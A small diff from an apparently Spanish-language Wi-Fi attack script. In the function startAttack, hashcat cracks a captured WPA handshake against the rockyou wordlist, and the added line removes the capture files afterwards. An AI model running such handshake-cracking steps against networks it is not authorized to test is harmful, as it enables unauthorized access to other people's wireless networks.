@@ -109,6 +109,7 @@ function startAttack(){
 			sleep 2
 
 			hashcat -m 22000 /usr/share/wordlists/rockyou.txt myHashes -d 1 --force
+   			rm Captura* 2>/dev/null
 		else
 			echo -e "\n${red}[!]${end} ${gray} No se a podido capturar el paquete necesario...${end}\n"
 		fi
